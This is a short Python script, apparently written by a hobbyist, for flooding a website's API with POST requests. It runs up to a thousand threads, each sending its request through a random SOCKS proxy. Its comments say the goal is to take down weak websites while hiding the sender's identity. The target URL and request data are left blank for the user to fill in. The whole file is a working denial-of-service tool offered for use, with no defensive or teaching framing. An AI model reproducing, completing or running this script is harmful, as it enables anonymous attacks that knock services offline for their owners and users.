import requests
import random
import os
import threading
from threading import Thread
import time
#def title as 
def title(name):
    os.system(f"Title {name}")
# calling title function and naming in quotation marks
title("")
#opening proxies.txt so that your ip doesnt get banned and they wouldnt know who you are
with open("proxies.txt","r") as file:
    # splitting the proxies into one line
    proxies = file.read().splitlines()
#defining raid function
def raid():
    # needs to be global since it isnt in a class
    global requestamt
    # picking a random proxy from the proxies.txt
    proxy = random.choice(proxies)
    # Enter the api for the website you want to take down. NOTE that the website must be weak in order for it to work 
    url = ""
    # send the data that the api needs to recieve, example "username":"Cejai", "password":"fdsfsfsf"
    data = {}
    try:
        #sending the post requests to the url with the data and the proxies, below is the code you need to use the proxies
        requests.post(url,data=data,proxies={"https": f"socks4://{proxy}"})
        #with every try statement you need an except but currently we dont need one so we just pass it
    except:
        pass
    #a while true statement is needed in order to run it multiple times and not once
while True:
    # setting the amount of threads you want 
    if threading.active_count() < 1000 + 2:
        # setting the target to the function where you want the threads to work and also starting it
        threading.Thread(target=raid).start()
        #if the thread is greater instead of stopping we put a time.sleep
    else:
        time.sleep(0.1)

